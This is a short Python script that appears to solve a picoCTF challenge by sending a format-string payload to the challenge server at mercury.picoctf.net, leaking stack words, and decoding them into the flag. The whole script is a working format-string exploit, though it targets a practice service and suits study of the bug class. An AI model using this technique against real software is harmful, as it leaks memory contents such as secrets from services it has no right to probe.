#!/usr/bin/env python3

import re
import socket
import struct

hostname = "mercury.picoctf.net"
port = 16439
payload = ",".join([f"%{i}$#010x" for i in range(14, 25)])


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((hostname, port))

    s.recv(1024)
    s.recv(1024)

    s.send(b"1\n")

    s.recv(1024)
    s.recv(1024)

    s.send(payload.encode("utf-8") + b"\n")

    buffer = s.recv(1024) + s.recv(1024)

buffer = buffer.decode("utf-8").splitlines()[1]
buffer = buffer.split(",")

result = []
for address in buffer:
    result.append(struct.pack("<I", int(address, 16)))
result = b"".join(result)

expr = re.compile(b"picoCTF{.*}")
flag = expr.findall(result)[0].decode("utf-8")

print(flag)